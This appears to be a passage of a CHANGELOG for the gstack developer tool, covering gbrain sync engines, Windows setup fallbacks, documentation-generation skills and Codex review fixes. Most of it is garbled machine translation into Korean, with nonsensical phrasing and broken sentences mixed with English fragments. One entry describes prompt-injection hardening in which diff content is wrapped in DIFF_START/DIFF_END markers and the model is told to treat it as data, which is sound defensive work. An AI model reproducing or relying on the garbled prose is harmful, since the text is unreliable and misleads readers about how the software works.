- **`setup`** — `IS_WINDOWS` 탐지 (~line 33)의 가까이에 새로운 `_link_or_copy SRC DST` 돕는 사람. 파일 vs 지시에 자동 dispatches + Windows-vs-유닉스, 및 유닉스 작풍 이름 별명으로 건너뛰기 (예: `gstack/open-gstack-browser`는 연결 크롬 별명으로를 위해) 소스가 디스크에 이렇게 해결하지 않을 때, 유닉스 작풍 이름 별명으로 (e.g.g. `gstack/open-gstack-browser`를 위해). 근원이 이렇게 Windows에 해결하지 않을 때 모든 일은 `set -e`를 개조했습니다. `cleanup_old_claude_symlinks`와 `cleanup_prefixed_claude_symlinks`는 Windows branch로 확장해, `--prefix`/`--no-prefix` 플립은 stale real-file SKILL.md를 뒤에 남겨두는 대신 복사합니다.
- **`.github/workflows/*.yml` (8 Linux workflows)** — every Linux `runs-on` switched to `ubicloud-standard-8`: `evals.yml`, `evals-periodic.yml`, `ci-image.yml`, `actionlint.yml`, `pr-title-sync.yml`, `skill-docs.yml`, `version-gate.yml`, and `make-pdf-gate.yml`'s Linux matrix entry. The `evals.yml` matrix default and the prose footer both updated to reference `ubicloud-standard-8`.
- **`.github/workflows/windows-free-tests.yml`** - GitHub 호스팅 무료 `windows-latest`에 머물. 테스트 목록은 4개의 새로운 파 테스트를 포함하도록 확장되었습니다. Blacksmith/GitHub-larger/Ubicloud-Windows의 초기 시도는 모두 실패했습니다 (등록되지 않은 상표, org-billing off, 납품업자는 각각 Windows를 제안하지 않습니다); 무료 `windows-latest`는 작동 경로입니다.
- **`.github/actionlint.yaml`** — 두 개의 Ubicloud Linux 라벨 (`ubicloud-standard-2`, `ubicloud-standard-8`)을 등록하여 작업 흐름을 허용한다. repo 루트에서 중복된 dead-weight `actionlint.yaml`는 제거된다 (actionlint는 `.github/actionlint.yaml`만 읽어들여야 한다).
- **`package.json`** — 스크립트의 세 `{ git rev-parse HEAD 2>/dev/null || true; } > path/.version` 버팀대 그룹을 `( ... )` 서브쉘으로 대체합니다. POSIX-universal, Bun-Windows-compatible.
- **`docs/gbrain-sync.md`, `docs/gbrain-sync-errors.md`** — 5개의 stale `gbrain_sync_mode` 설정키 참조 → `artifacts_sync_mode` (v1.27.0.0에서 착륙된 이름이지만, 두 개의 문서는 여전히 오래된 키에 지적).

#### 기여자

- **건축 invariant (우니 코드):** every JSON.stringify call that serializes page-content-derived strings MUST be passed `sanitizeReplacer` (for object payloads where consumers will JSON.parse) OR the resulting body MUST be wrapped in `sanitizeLoneSurrogates` (for text/plain responses). Today this is enforced by `handleCommandInternal`'s sanitizing wrapper for command results and explicit `sanitizeReplacer` arguments at the two SSE producers. New SSE/WebSocket writers must follow the same pattern; 두 생산자 근방의 인라인 의견은 이렇게 말합니다.
- **건축 invariant (setup):** `setup` MUST 의 각 symlink는 `_link_or_copy`를 통해서 갑니다. `test/setup-windows-fallback.test.ts`의 정체되는 invariant — 돕는 사람 몸의 외부 단 하나 익지않는 `ln` 콜걸은 CI 을 실패합니다.
- **시험 적용 간격 닫히는:** 이 파 이전에는 Windows CI lane (`windows-free-tests.yml`)는 install-symlink 경로, Unicode 위생, 빌드-script 포탄 compat, 또는 doc-config 편류를 운동하지 않았습니다. 이제 모두 PR에서 실행됩니다.
- **범위 (P2 후속):** `browse/src/snapshot.ts` (덮음 WebSocket 구조가 `cr.result`를 전달하지 않는)에 질화 더 깊은 누르기; 24 POSIX를 달기 위하여 자유로운 시험에 Windows (`windows-free-tests.yml`의 자신의 의견에서 추적하는) 항구를 향하게.

## [1.37.0.0] - 2026-05-14

## **분할 엔진 gbrain: 뇌를 위한 먼 MCP, 코드를 위한 국부적으로 PGLite.** ## **Symbol-aware code 지금 크로스 머신 지식과 함께 코엑스를 검색합니다.**

Path 4 (Remote MCP) setup gets a new opt-in at Step 4.5: a tiny local PGLite (~30s, ~120 MB) for `gbrain code-def`, `code-refs`, `code-callers` per worktree. The remote brain keeps holding artifacts, transcripts, and cross-machine queries. The two engines stay independent. Transcripts route to the artifacts repo on remote-MCP machines, the brain admin's pull job indexes them, and the local PGLite stays code-only with no transcript pollution. `gstack-gbrain-detect`의 새로운 `gbrain_local_status` 필드는 ok/no-cli/가락 구성/끊긴 구성/끊긴 db를 구별합니다; `/sync-gbrain`와 sync 오케스트라터는 두 문이 이렇게 죽은 Postgres URL는 ERR 산출의 2 단계 대신 명확한 구색 메시지를 줍니다.

`/setup-gbrain` Step 1.5 (new) detects a broken local engine on re-run and offers four options: Retry the probe, Switch to PGLite (one-way, .bak rollback on failure), Switch brain mode (fall through to Step 2's path picker), or Quit. `/sync-gbrain` Step 1.5 (new) STOPs cleanly on broken-config / broken-db with a remediation message and SKIPs code+memory in `missing-config + remote-http` so the brain-sync push to the artifacts repo still runs.

### 중요 한 숫자

출처: `bun test test/gbrain-local-status.test.ts test/gbrain-detect-shape.test.ts test/gbrain-sync-skip.test.ts test/gbrain-init-rollback.test.ts test/gstack-upgrade-migration-v1_37_0_0.test.ts` — 5개의 새로운 문 층 시험 파일, 27의 케이스, ~5s에 있는 모든 녹색. 주기적인 층 E2E `test/skill-e2e-setup-gbrain-path4-local-pglite.test.ts`는 가득 차있는 경로 4 + 단계 4.5 Yes는 stub MCP에 대하여 교류를 달고 280s에서 통과합니다.

| Surface | 의 전 | 후지후 |
|---|---|---|
| Path 4 + `/sync-gbrain --full` 출력 (Garry의 끊긴 db 국가) | `ERR code source registration failed: gbrain not configured (run /setup-gbrain)` + `ERR memory gbrain import exited 1: Cannot connect to database` | `SKIP code skipped — local engine broken-db — config points at unreachable DB; see /setup-gbrain Step 1.5` + 뇌 동기화는 일반적으로 뛰습니다 |
| `bin/gstack-gbrain-detect` 실행 시간 | bash + jq, single-purpose probe | TypeScript shebang 스크립트는 관현관과 `localEngineStatus()` 클래스터를 공유합니다. 10 JSON 필드, 9개의 기존 키 바이트-compat; 하나의 새로운 `gbrain_local_status` enum. Memoized 결말은 기술 당 중복 포크-exec의 ~400ms를 잘라냅니다. |
| 상태 probe 비용 | `gbrain doctor --json` `--fast` 없이 DB는 죽은 DB에 5s까지 걸을 수 있었습니다 | `gbrain doctor --json --fast` (3s 천장) + DB-reachability via `gbrain sources list --json` stderr 분류 (~80ms 꾸준한), 60s TTL 시렁에 열쇠가 되는 `{HOME, PATH, gbrain bin, gbrain version, config mtime}` |
| Path 4 사용자 검색 코드 | 숨겨지은 — 단지 `/sync-gbrain` 오류가 그것에 | `/gstack-upgrade` 마이그레이션 v1.37.0.0 `gbrain_mcp_mode == remote-http` AND `gbrain_local_status == missing-config`일 때 한 번 공지를 인쇄합니다. `gstack-config set local_code_index_offered true`는 침묵에. |
| Transcripts는 원격 뇌에서 색인을 붙였습니다. | Local-only `gbrain import`는 LOCAL 엔진에, 사용자가 단계 4.5로 선택하면 PGLite를 오염시킵니다. | `gstack-memory-ingest`는 tmpdir 대신 `gbrain import`로 `~/.gstack/transcripts/run-<pid>-<ts>/`로, 단계로 표시된 각광자를 검출합니다. `bin/gstack-brain-sync` allowlist는 `transcripts/run-*/*.md`를 커버합니다; 뇌 관리 잡아당기기와 색인. |

### 항목화 된 변경

#### 추가

- `lib/gbrain-local-status.ts` — 60s TTL 캐시와 `--no-cache` 플래그를 가진 공유된 5개의 상태 엔진 상태 분류기 (`ok`/`missing-config`/ `broken-config`/ `broken-db`)를 가진 공유된 5개의 상태 분류기 (`ok`/ `gbrain sources list --json` + stderr 분류를 통해 조사하십시오 `lib/gbrain-sources.ts:66-67`에서 정확한 본을 재사용.
- `/setup-gbrain` 단계 1.5 — 4개의 선택권 (PGLite/스위치 뇌 형태/쿼트에 리트리/스위치)를 가진 끊긴 db 구제. PGLite 스위치는 구부리 안전합니다: `mv ~/.gbrain/config.json`를 비 zero 출구에 구부리는 `.bak`, `gbrain init --pglite`, .bak verbatim를 복구합니다.
- `/setup-gbrain` 단계 4.5 — 경로 4 로컬 PGLite 코드 검색에 대 한 선택. Yes 경로 실행 `gstack-gbrain-install` (idempotent) + `gbrain init --pglite --json` 같은 롤백 semantics. No 경로는 4 원격-MCP-만 경로 유지.
- `/sync-gbrain` 단계 1.5 - 사전 flight 로컬 엔진 상태 체크. 재약, `missing-config + remote-http`에서 SKIPs code+memory를 가진 부서지는 구성/끊긴 db에 주식은 아직도 달립니다.
- `gstack-upgrade/migrations/v1.37.0.0.sh` — 기존의 경로 4 사용자를 위한 한 번 발견성 고시가 아직 no 로컬 엔진이 있는 경우.
- `bin/gstack-brain-sync` allowlist — `transcripts/run-*/*.md` 그래서 리모트 MCP `~/.gstack/transcripts/`에 persisted를, artifacts repo에 도달합니다.
- 새로운 테스트 파일 (게이트 계층, 모든 조폐, no 실제 gbrain): `gbrain-local-status.test.ts` (11건), `gbrain-detect-shape.test.ts` (8건), `gbrain-sync-skip.test.ts` (5건), `gbrain-init-rollback.test.ts` (3건), `gstack-upgrade-migration-v1_37_0_0.test.ts` (5건).
- 주기적인 층 E2E `skill-e2e-setup-gbrain-path4-local-pglite.test.ts` 가득 차있는 경로 4 + 단계 4.5 Yes 교류를 위해.

#### 변경

- `bin/gstack-gbrain-detect` - rewritten bash → TypeScript shebang 스크립트. 파일명은 편집하지 않고 기존의 기술 preamble callers shell을 변경하지 않았습니다. 9개의 JSON 필드는 이름 + 유형 + semantics를 보존합니다. 새로운 `gbrain_local_status` 필드가 추가되었습니다. 문서화 된 의존성 : `bun` (gstack 설치 프로그램에서는 이미 이것을 제공합니다).
- `bin/gstack-gbrain-sync.ts` — `runCodeImport()` + `runMemoryIngest()` `{ran: false, summary: "skipped — local engine <status>; remote MCP unaffected"}` `localEngineStatus() != 'ok'`일 때 반환 `{ran: false, summary: "skipped — local engine <status>; remote MCP unaffected"}`. 두뇌 동기화 단계는 계속 관계 없이 계속합니다.
- `bin/gstack-memory-ingest.ts` — `gbrain_mcp_mode === 'remote-http'`일 때, `~/.gstack/transcripts/run-<pid>-<ts>/`에 단계별 성적을 얻고, 지방 `gbrain import`를 전직합니다.
- `bin/gstack-artifacts-init` - `transcripts/run-*/*.md` 및 `transcripts/run-*/**/*.md` (개인 정보 등급: 행동)를 포함하기 위하여 관리된 `.brain-allowlist`를 확장합니다.
- `sync-gbrain/SKILL.md.tmpl` 단계 1 - 메모리 스테이지에 대한 잘못된 제안을 수정 "MCP를 통해 여정." 기억 단계는 항상 로컬 `gbrain import`로 쉘; 원격 http 모드에서는 대신 멸종 마크 다운을 멸종시킵니다.

#### 고정

- `test/gstack-next-version.test.ts`의 사전 노출 조각 - default 5s에서 15s에 당 시험 시간 초과를 범람했습니다. `gstack-next-version` CLI는 스위트로드에서 M 시리즈 Mac에 4-5s 벽 시간을 소요하고 5001ms를 통해 간헐적으로 기울입니다.

#### 기여자

- 새로운 공유 클래스터 패턴 : `lib/gbrain-local-status.ts` 수출 `localEngineStatus()`, `resolveGbrainBin()`, `readGbrainVersion()`. 후자는 PATH에 키워진 처리 당 측정을 측정하므로 + 클래스터 공유 포크-exec 결과를 감지합니다.
- 계획 파일 `~/.claude/plans/the-real-product-fix-squishy-galaxy.md`에서 캡처 한 13 가지 건축 결정은 Codex 외부 청구서 발견 (4 구조 결정이되었다 : proactive 설정 질문을 유지, artifacts repo, SKIP+brain-sync를 통해 transcript를 경로를 끊긴 엔진, 재량 우선 수리 메뉴).

## [1.35.0.0] - 2026-05-13

## **Docs는 추적 표면이되고, afterthought가 아닙니다. `/document-generate`는 4개의 Diataxis 사분면에 있는 찰상, `/document-release` 감사 적용에서 그(것)들을 씁니다.** ## **PR는 이제 발송된 어떤 대를 문서화한지의 적용 지도를 발송합니다. 새로운 기술은 자습서, 방법, 참조 및 코드의 설명을 생성합니다. 둘 다 동일한 어휘를 말해서, 이렇게 간격은 침묵적으로 축적하는 대신 PR 몸에서 눈에 보입니다.**

You can now run `/document-generate` to write missing documentation from scratch. The skill reads your code first (the codebase archaeology step is non-skippable), maps the public surface, then writes docs in the four Diataxis quadrants: tutorial (newcomer walkthrough), how-to (task-oriented), reference (factual API description), explanation (design rationale). It runs standalone or chains automatically from `/document-release` when the coverage map finds gaps. `/document-release`는 4개의 사분면에 걸쳐 모든 새로운 개성을 점수하는 단계 1.5 적용 지도를 얻었습니다. 0개의 적용을 가진 항목은 PR 몸에 있는 긴 간격으로 위로 보여줍니다. 참고 전용 적용 범위가 일반적인 간격으로 위로 보여줍니다. 건축 도표는 diff에 대하여 면책한 이름 편류를 위해 스캔됩니다. CHANGELOG 음성 체크는 지금 0-3의 인기 마찰을 이용합니다: “what changes?”, “왜 걱정?”, “How care?” 그리고 “reritory”는 2개를 사용합니다.

CLAUDE.md 문서의 새로운 섹션은 `garrytan-agents` PR을 위한 포크 PR 워크플로우를 문서로 합니다. push branch를 `garrytan/gstack`로 바꾸고, 다시 태그를 다시 입력하면 비밀에 접근할 수 있습니다. 패턴은 모든 포크에 크게 팽창시키는 대신 branch에 비밀 배급 scoped를 유지합니다.

### 중요 한 숫자

출처: PR의 diff와 `origin/main`에 대한 새로운 기술 템플릿 `document-generate/SKILL.md.tmpl`.

| Surface | 의 전 | 후지후 |
|---------|--------|-------|
| Doc-generation 기술 | 1 (`/document-release`) | 2 (`/document-generate` + 강화 `/document-release`) |
| Diataxis 사분면 PR 몸 | 0 | 4 (tutorial / 방법 / 참조 / 설명) |
| `/document-release` 워크플로우 단계 | 9 | 9 + 새로운 단계 1.5 (복사지도) |
| CHANGELOG 음성 득점 | gut-check ("사용자가 'oh nice'라고 생각 했습니까?") | 0-3 루비 (3 = 참고 + 설명 + 모든 현재 방법) |
| 건축 도표 편류 탐지 | none | ARCHITECTURE.md 에 대하여 diff 에 대하여 /removed 에 대하여 검사하십시오 |
| PR의 Doc-debt 가시성 | none | `### Documentation Debt` Diataxis 중세 당 중요한 + 일반적인 간격과 가진 subsection |

`/document-generate`는 1184-line 생성 SKILL.md를 생성하는 새로운 템플렛의 446의 선입니다. Diataxis vocabulary는 "did docs는 개정을 얻습니까?"를 불합리한 것 대신에 가시 대답 만듭니다.

### 다운스트림 gstack 사용자를 위한 이 수단은

docs가 완료된지 여부를 추측합니다. 새로운 기술을 발송할 때 `/document-release`는 당신이 덮어지고 건너뛰는 사차를 보여 주고, PR의 사차가 그(것)들을 볼 수 있는 PR의 사차가 있는 사차가 있는 곳을 보여줍니다. 기존 프로젝트의 docs를 부트 스트랩으로 할 때 `/document-generate`는 1개의 세션에서 0에서 4개의 물방울 적용으로 걸어갑니다. Diataxis는 `/ship`, `/document-release`, `/document-generate`를 통해 공유된 어휘가 되고, 어떤 기술은 당신이 튜토리얼을 가지고 있는지 알고 있는 다음을 옵니다.

사용하려면 `/document-release` 이후 `/ship` (또는 `/ship` 자동 호출을하자), PR 몸에 적용 지도를 참조하고, `/document-generate`를 실행하면 중요한 간격이 나타납니다.

### 항목화 된 변경

#### 추가

- **`/document-generate` 기술** (`document-generate/SKILL.md.tmpl`, 446 줄): 9단계 워크플로우를 가진 Diataxis 근거한 문서 생성기 - 범위, 코베이스 고고학, 칸막이, 참고, 설명, 방법, 자습서, 크로스 링크, 품질 자체 리뷰. 문서의 단일 라인 쓰기 전에 전체 코베이스를 읽으십시오.
- **`/document-release` 단계 1.5 - 적용 지도**: 새로운 public 표면을 위한 diff를 검사합니다 (skills, CLI 깃발, 구성 선택권, API 엔드포인트), 분류합니다 각 법인에 의하여 Diataxis 사분면 적용, 깃발 일반적인 간격으로 0 coverage 품목. 산출은 PR 몸을 먹이를 출력합니다.
- **`/document-release` 건축 도표 편류 탐지**: ASCII/Mermaid 블록 ARCHITECTURE.md, diff에 대한 상호 참조, 플래그 이름이 바뀌는 /removed 엔티티티를 추출합니다.
- **`/document-release` `### Documentation Debt` PR 몸에 있는 단면도**: 표면 긴요한 간격, 일반적인 간격 및 1 선 묘사 + Diataxis 품목 당 quadrant를 가진 stale 도표. `docs-debt` 상표를 추가하는 건의하십시오.
- **`/document-release` CHANGELOG 판매 시험 윤활유**: 0-3 항목 당 득점 (1개 점 각 참고/설명/방법에 적용을 위해). 2 이하 항목은 rewritten를 얻습니다.
- **기술 라우팅 항목**: `/document-generate` `SKILL.md` 라우팅 규칙과 `README.md` 기술 테이블에 추가 (기술 작가 카테고리).
- **CLAUDE.md 포크-PR 워크플로우 섹션**: PR가 비-collaborator fork에서 인 경우에 "check out <PR link>"를 처리하는 문서 방법. branch를 `garrytan/gstack`로 밀어넣으십시오, 포크 PR를 닫고, 기초 대포 branch에서 새로운 PR를 엽니다. 비밀 배급 범위를 지키십시오.

#### 변경
- `/document-release` 묘사와 방아쇠는 적용 지도와 `/document-generate` chaining를 참고하기 위하여 새롭게 했습니다.
- README.md 기술 테이블 그룹화: `/document-release`와 `/document-generate`는 기술 작가 카테고리의 밑에 지금 나타납니다.

#### 기여자
- `document-generate/SKILL.md`는 `document-generate/SKILL.md.tmpl`에서 생성됩니다. `.md`를 직접 편집하지 마십시오. `bun run gen:skill-docs`를 템플렛 편집 후에 실행하십시오.
- `gstack/llms.txt` 이제 `/document-generate` (기술 템플릿에서 자동 재생)를 나열합니다.

## [1.34.2.0] - 2026-05-13

## **PR의 3개의 파일 버그 땅. `/codex review`, `/investigate` 학습 및 `/sync-gbrain` 엔진 탐지는 다시 일합니다.** ## **CLI 범프 `/codex review`. 한 잊혀진 allowlist는 수사 역사의 년을 침묵으로 떨어졌다. 버그의 한 쌓는 쌍은 `/sync-gbrain` 각 Supabase 사용자를 위해 `/sync-gbrain`를 몹니다. 모든 3개는 회귀 시험으로 본을 잠그는 조정입니다.**

`/codex review`는 일 Codex CLI 0.130.0 배송을 했습니다. CLI는 `[PROMPT]`와 `--base <branch>`를 상호적으로 독점으로 만들고, 2A는 항상 두 가지를 통과했으므로, 모든 리뷰는 모델에 이야기하기 전에 종료되었습니다. 수정: `codex review --base`를 default 케이스, `codex exec`를 위한 DIFF_START/DIFF_END de`/codex review <focus>`는 default를 위한 실행을 유지합니다. default는 지시를 위한 실행을 보존합니다; Codex 0.130이 no 문서화 된 시스템 보호 구성 키가 없기 때문에 베어 경로는 배이며, 기술 파일이 그 지침이 공개되어 있습니다. 주문 파괴 리뷰는 현재 Adversarial diff 내용으로부터 신속한 주입에 대한 방어 (제한 패턴은 데이터가 종료되고 지침이 다시 시작되는 모델에 대해 알려줍니다.

`/investigate`는 `type: "investigation"`와 학습을 로그 하는 에이전트를 말했지만 `bin/gstack-learnings-log:22`는 `[pattern, pitfall, preference, architecture, tool, operational]`에 아무것도 거부했습니다. 유형이 stderr 메시지가 썼고 1번 출구 코드를 확인했기 때문에 사용자에게 침묵하게 종료되었습니다. 루트 때문에 발견의 년은 아무 것도 갔다. 일행 수정: `investigation`를 `ALLOWED_TYPES`에 추가하십시오.

`/sync-gbrain`는 gbrain ≥ 0.25에 각 Supabase 사용자를 위한 `engine: "unknown"`를 돌려보냅니다. 두 겹쳐 쌓이는 버그. `execSync("gbrain doctor --json --fast 2>/dev/null")`는 비 zero 출구 (gbrain 의사 출구 1에 `health_score < 100`, 그것 근본적으로 각 신선한 설치 때문에 `resolver_health` 경고), 그래서 JSON 산출 결코 파서에 도달하지 않았습니다. 그리고 gbrain ≥ 0.25는 어떤 의사 산출에서 최고 수준 `engine`를 떨어뜨렸습니다. 수정은 stdout를 던짐 오류 객체에서 다시 복구하고 `~/.gbrain/config.json` (`GBRAIN_HOME`를 다시 떨어뜨릴 때 의사가 엔진을 표면이 아닌지. 또한 `execSync`에서 `execFileSync`로 호출을 이동하므로 쉘 리디렉션은 Windows-portability Footgun이 아니며, 오류 로깅을 `~/.gstack/.gbrain-errors.jsonl`로 추가합니다. 그래서 미래의 파동 실패가 눈에 보입니다.

### 중요 한 숫자

출처: `bun test test/gstack-memory-helpers.test.ts test/learnings.test.ts test/codex-hardening.test.ts` (75의 시험, 149는, 26 초를 예상합니다) 플러스 Codex CLI 0.130.0 및 임시 직원 `GBRAIN_HOME`에 있는 합성 GBrain 구성에 대하여 repo 관계되는 연기 시험 플러스.

| 팟캐스트 | 의 전 | 후지후 |
|---|---|---|
| `/codex review` Codex CLI 0.130.0 | `error: the argument '[PROMPT]' cannot be used with '--base <BRANCH>'`, 모든 호출 다이 | 베어 리뷰 작품; `/codex review <focus>` 노선을 통해 `codex exec` 와 DIFF_START/END 마커 |
| `/codex review <focus>` 신속한 사출 표면 | no data/instructions 경계로 신속한 내용 | DIFF_START/DIFF_END delimiters plus tempfile pattern, 명시된 "데이터로의 변형" 모델에 대한 명령 |
| `/investigate` 학습 지속 | 1번 출구에서 stderr, no 로그 작성, 사용자에 대한 보이지 않는 | 0번 출구, 학습 완료, 미래 세션은 우선 루트를 찾는다. |
| gbrain ≥ 0.25에 `/sync-gbrain` 엔진 + Supabase | `engine=unknown`, 모든 동기화 단계는 조용히 건너 뛰고 | 의사 stdout 회복 또는 `~/.gbrain/config.json` fallback을 통해 `supabase`에 해결 |
| 개발자의 실제 설정에서 실행할 때 테스트 격리 | 시험은 진짜 `~/.gbrain/config.json`, 검토자의 기계에 의하여 통행 또는 파밀을 읽었습니다 | `HOME` + `GBRAIN_HOME` + `PATH`를 임시 직원 디너에 놓는 시험 |
| Codex 템플릿 회귀 가드 | None, 주에 발송되는 부서지는 국가 | 정적 테스트 asserts no `codex review` 선은 `--base`, `.tmpl` 소스 AND 생성 `SKILL.md`의 앞에 `--base`를 가진 인용된 신속한 결합합니다 |

### 이 빌더를 위한 뜻

`/codex review`가 Codex CLI가 0.130.0를 기록한 이후 논쟁에 실패한 경우, `/gstack-upgrade`를 실행하여 이 위로를 선택해야 합니다. `/investigate`를 타입의 소개와 이 릴리스 사이에 ran `/investigate`를 갖는 경우, 학습이 떨어졌다 (they Exit-1'd to stderr only, so there are nothing to recover), 하지만 모든 조사의 근절을 기대하는 것은 기록되고 재평가할 수 있는 경우 `/sync-gbrain`는 다시 시작되지 않았습니다. `/sync-gbrain`를 다시 사용해서는 안되는 경우, `/sync-gbrain`를 다시 사용하게 됩니다. #1428, `diogolealassis`, #1423, `Shiv @shivasymbl`, #1415)에 `Stashub`에 3명의 보고자 (`Stashub`) 각각은 청결한 재개발을 신청하고, Shiv의 케이스에서 시험한 헝겊 조각을 발송했습니다. 그것이 인 신용.

### 항목화 된 변경

#### 고정

- **`codex/SKILL.md.tmpl` 단계 2A** - 두 개의 동요 지점과 비조건 `codex review "$boundary" --base <base>` invocation를 대체했습니다. Default (no 사용자 설명서) : 베어 `codex review --base <base>`. 사용자 정의 지침 : `$_PROMPT_FILE`는 파일 시스템 경계, 사용자의 초점 및 diff 사이 `DIFF_START` / `DIFF_END` 마커가 있습니다. `-c 'system_prompt="..."'` Codex에 대한 `-c 'system_prompt="..."'`를 Codex; 0.130; 키는 문서화되지 않고 침묵하지 않습니다. 는, 그래서 는 경로를 다시 주사 경계없이 발송합니다. `.claude/` 및 `agents/`의 밑에 기술 파일은 public이므로 안전하지 않습니다. `Stashub`에 #1428에 의해 기여한 보고서.
- **`bin/gstack-learnings-log`** - `'investigation'` 에 `ALLOWED_TYPES` (was: `[pattern, pitfall, preference, architecture, tool, operational]`) 추가했습니다. 유효한 유형 목록에 사용법 의견을 새롭게 하십시오. `diogolealassis` 에 #1423에 의해 기여한 보고서.
- **`lib/gstack-memory-helpers.ts`** - `freshDetectEngineTier`. 3개의 변화: `execSync`에 `execFileSync`를 전환해 bash-specific `2>/dev/null` 포탄 리디렉션을 삭제하기 위하여 전환했습니다 (Windows에 휴대용); 던지기 오류 목표에서 stdout를 재기하지 마십시오 `gbrain doctor`에서 JSON에서 `gbrain` 구성 (`$GBRAIN_HOME`를, 출력할 때 JSON를, 출력할 때 `gbrain`를, 출력합니다. `logGbrainError` 의 도움자는 파스 실패에 `~/.gstack/.gbrain-errors.jsonl`에 1 선 JSONL를 부풀어 놓습니다. 패치 모양은 #1415에 `Shiv @shivasymbl`에 의해 공헌했습니다; gstack v1.31.0.0 + gbrain v0.31.3 + Supabase에 대하여 시험했습니다.

#### 추가

- **`test/gstack-memory-helpers.test.ts`** — `detectEngineTier` 스케마에 대한 회귀 테스트_버전:2의 fallback 경로. `HOME`, `GSTACK를 설정합니다._HOME`, `GBRAIN_HOME`, and `PATH` to temp dirs (so the test doesn't read the developer's real `~/.gbrain/config.json` or invoke a real `gbrain`), writes a synthetic `{"engine":"postgres","database_url":"..."}` to the temp `GBRAIN_HOME`, asserts `detectEngineTier()` returns `engine: "supabase"`. 기존 `detectEngineTier` `beforeEach`/`afterAll` 블록은 `HOME`와 `GBRAIN_HOME`를 분리하기 위해 확장되었으며, 사전 테스트가 검토자의 기계에 어떤 것을 읽을 수 있는지 확인한 가짜 소스를 닫았습니다.
- **`test/learnings.test.ts`** - `investigation` 유형에 대한 두 가지 테스트. `type: "investigation"`와 `gstack-learnings-log`와 `type: "investigation"`와 함께 한 라운드 스트립은 파일이 입력됩니다. 다른 읽기 `investigate/SKILL.md.tmpl` 그리고 asserts it is a="`"type":"investigation"` verbatim, 콜러 계약은 잘못된 유형으로 드리기 위해 템플릿에 대한 가드.
- **`test/codex-hardening.test.ts`** — BOTH `codex/SKILL.md.tmpl` AND에 적용되는 2개의 시험은 생성한 `codex/SKILL.md`를 나타냅니다. 첫번째 파즈 단계 2A의 단면도 및 asserts no `codex review` invocation line은 `--base`를 가진 인용하 보호 또는 변하기 쉬운 지위 인자를 결합합니다. 2A 단계가 아직도 벌거벗은 `codex review --base` OR `codex exec` `codex exec`를 포함합니다, 앞으로 수정하는 것은 지나치게 자동적으로 막습니다.

#### 기여자

- `-c 'system_prompt="..."'`의 Codex 0.130의 probe는 계획에서 생활, 코드 기초 아닙니다. 미래 Codex 방출이 진짜 체계 prompt 구성 열쇠를 드러내는 경우에, 벌거벗은 `codex review --base`에 있는 파일 시스템 경계를 재 주사하는 것은 `codex/SKILL.md.tmpl`에 3 선 후속 접속 헝겊 조각입니다.
- "supabase"엔진은 "remote postgres"를 연습하는 것을 의미합니다. Gbrain config는 `engine: "postgres"`과 로컬 포스트 테스트에 대한 두 실제 Supabase를 사용하며 `freshDetectEngineTier` 모두 `"supabase"`를 모두 다운스트림 동기화 코드가 동일하게 취급하기 때문에 사용합니다. 라벨 압축은 문서화 된 인라인입니다.

## [1.34.1.0] - 2026-05-13

## **`gstack-update-check`는 SHA를 통해 VERSION를, URL를 통해서 먼 VERSION를 해결합니다.** ## **semver-order guard는 스크립트가 다운 그레이드를 제안하지 않도록합니다.**

버전 체크는 이제 `git ls-remote https://github.com/garrytan/gstack.git refs/heads/main`를 실행하여 HEAD SHA를 얻고 `raw.githubusercontent.com/garrytan/gstack/<SHA>/VERSION`를 멈춥니다. SHA-pinned raw URL은 즉시 일관되게, 그래서 신선하게 출판된 VERSION는 몇몇 분에 의하여 분에 분에 의하여 분에 분대 CDN의 뒤에 추적 대신에 즉시 보여줍니다. 두 번째 가드는 `REMOTE < LOCAL`를 최신으로 취급하므로, 따라서 일시적인 stale-CDN 응답과 dev는 주 앞의 실행을 결코 생산할 수 없습니다. `UPGRADE_AVAILABLE` 선. `git ls-remote` 호출은 `GIT_TERMINAL_PROMPT=0`와 5 초 저속 운동으로 담겨있어서 flaky 네트워크와 캡티브 포털은 기술이 전방을 걸 수 없습니다.

### 중요 한 숫자

출처: `bun test browse/test/gstack-update-check.test.ts` — 35개의 기존 테스트 + 3개의 새로운 semver 가드 테스트, 1.65s에 있는 모든 녹색.

| Surface | 의 전 | 후지후 |
|---|---|---|
| 먼 VERSION fetch | branch급 URL (`/garrytan/gstack/main/VERSION`)는 push 후에 분을 위한 stale 내용을 봉사할 수 있습니다 | `git ls-remote` SHA, 그 후에 SHA 핀으로 꼿는 익지않는 URL (즉일한 일관되게), branch 원료는 fallback로 지켜집니다 |
| REMOTE LOCAL를 때 비동기 | `UPGRADE_AVAILABLE <local> <older>` (뒤로 고급 프롬프트) | `UP_TO_DATE <local>` (실렌트, `sort -V`를 통해 semver-order 가드) |
| `GSTACK_REMOTE_URL` 과도한 semantics | 항상 영광 | 명시할 때 드리프트; `file://` 시험 정착물 및 개인 거울 보존 |
| `git ls-remote` 걸림새 노출 | 사용안내 | `GIT_TERMINAL_PROMPT=0` + `GIT_HTTP_LOW_SPEED_LIMIT=1000` + `GIT_HTTP_LOW_SPEED_TIME=5`는 걸려있는 연결에 5 초 지면을 강제합니다 |
| Multi-segment 버전 비교 | `[ "$LOCAL" = "$REMOTE" ]`만 | `printf "%s\n%s\n" $LOCAL $REMOTE | 정렬 -V | 꼬리 -1` validates ordering. `1.9.0.0 < 1.10.0.0` 두 방향 |
| 이 실패 모드에 대한 테스트 적용 | 0 테스트 | 3개의 새로운 시험: REMOTE LOCAL, 다 세그먼트 앞으로, 다 세그먼트 반전 보다는 오래 |

semver 가드가 실패 모양을 직접 붙잡습니다. GitHub의 branch 형 CDN가 스테이플 콘텐츠를 다시 봉사하는 경우에, 스크립트는 이미 통과한 버전에 "업그레이드"에 사용자가 묻지 않는 대신 침묵을 체재합니다.

### 이 빌더를 위한 뜻

`/gstack-upgrade`를 새로 출시한 후, 스크립트는 CDN를 새로 고침하기 위해 CDN를 기다리는 대신 살아있는 ref를 통해 새로운 VERSION를 찾아냅니다. Dev는 메인을 앞두고, no를 더 뒤로 프롬프트를 각 preamble에 유지합니다. No 동작이 필요한 경우, 수정은 업그레이드에 자동적입니다.

### 항목화 된 변경

#### 고정

- **`bin/gstack-update-check`** - `git ls-remote`를 통해 `raw.githubusercontent.com/garrytan/gstack/<SHA>/VERSION`를 통해 살아있는 HEAD를 해결하는 SHA를 가진 `raw.githubusercontent.com/.../main/VERSION`의 unconditional `curl`를 첫째로 대체했습니다. `git ls-remote`가 사용되지 않거나 `GSTACK_REMOTE_URL`가 명시적으로 놓일 때 분기 급변하는 fetch는 낙하로 유지됩니다.
